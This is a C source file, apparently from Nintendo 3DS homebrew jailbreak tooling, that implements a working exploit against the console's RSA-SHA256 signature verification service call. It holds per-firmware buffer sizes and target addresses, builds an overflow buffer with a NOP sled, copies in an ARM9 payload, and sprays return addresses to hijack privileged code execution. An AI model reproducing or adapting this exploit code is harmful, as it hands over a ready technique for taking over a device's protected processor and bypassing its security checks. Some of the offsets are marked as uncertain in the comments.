#include "rsa_exploit.h"
#include "arm9.h"
#include "svc.h"
#include "os.h"

Result PS_VerifyRsaSha256_Exploit(Handle *handle)
{
    Result ret = 0;
    u32 *cmdbuf = getThreadCommandBuffer();
    u32 bufSize, baseAddr;
    u32 fversion = (*(vu32*)0x1FF80000) & ~0xFF;
    switch(fversion)
    {
	case SYSTEM_VERSION(3, 32, 0): // v1 safe_mode firm, old3ds (latest since firmware 3.0.0-X) c0b0-bd64=34c
            bufSize = 0xD9B8; 
            baseAddr = 0x080B9580;
            break;	
        case SYSTEM_VERSION(2, 27, 0): // 1.0
            bufSize = 0xD9B8; // (?)
            baseAddr = 0x080B95C0;
            break;
        case SYSTEM_VERSION(2, 28, 0): // 1.1
            bufSize = 0xD9B8; // (?)
            baseAddr = 0x080B9620;
            break;
        case SYSTEM_VERSION(2, 29, 7): // 2.0
            bufSize = 0xD9B8; // (?)
            baseAddr = 0; // don't know
            break;
        case SYSTEM_VERSION(2, 30, 18): // 2.1
            bufSize = 0xD9B8;
            baseAddr = 0x080C2340;
            break;
        case SYSTEM_VERSION(2, 31, 40): // 2.2
            bufSize = 0xD9B8; // (?)
            baseAddr = 0x080C2520;
            break;
        case SYSTEM_VERSION(2, 32, 15): // 3.x
            bufSize = 0x7440;
            baseAddr = 0x080C4420;
            break;
        case SYSTEM_VERSION(2, 33, 4): // 4.0
            bufSize = 0x7440;
            baseAddr = 0; // don't know
            break;
        case SYSTEM_VERSION(2, 34, 0): // (4.1, 5.0[
            bufSize = 0x7440;
            baseAddr = 0x080C3EE0;
            break;
    }

    if(baseAddr == 0)
        return -1;

    u32* buffer = (u32 *)0x004C0000; // bss
    memset(buffer, 0, bufSize);

    buffer[0x28/sizeof(u32)] = 0x820002;
    buffer[0x2C/sizeof(u32)] = (u32)(buffer + 0x80/sizeof(u32));
    buffer[0x30/sizeof(u32)] = (bufSize << 4) | 0xA;
    buffer[0x34/sizeof(u32)] = (u32)(buffer + 0x380/sizeof(u32));
    buffer[0x280/sizeof(u32)] = bufSize<<3; //RSA bit-size, for the signature.

    u32 *ptr = buffer+0x380/sizeof(u32);
    u32 size;
    const u32 *src = (const u32 *)getArm9Payload(&size);
    u32 nopsled = 0x100; // FIXME do we need such a  large NOP sled?

    for(u32 i = 0; i < nopsled/sizeof(u32); i++)
        *ptr++ = 0xE1A00000;

    memcpy(ptr, src, size);
    ptr += size/sizeof(u32);

    for(u32 i=0; i < bufSize-size-nopsled; i+=4)
        *ptr++ = baseAddr;

    memcpy(cmdbuf, buffer, 0x80);

    cmdbuf[0] = 0x00020244;

    if((ret = svcSendSyncRequest(*handle))!=0) return ret;

    //We do not expect to return from the syncRequest
    return (Result)cmdbuf[1];
}
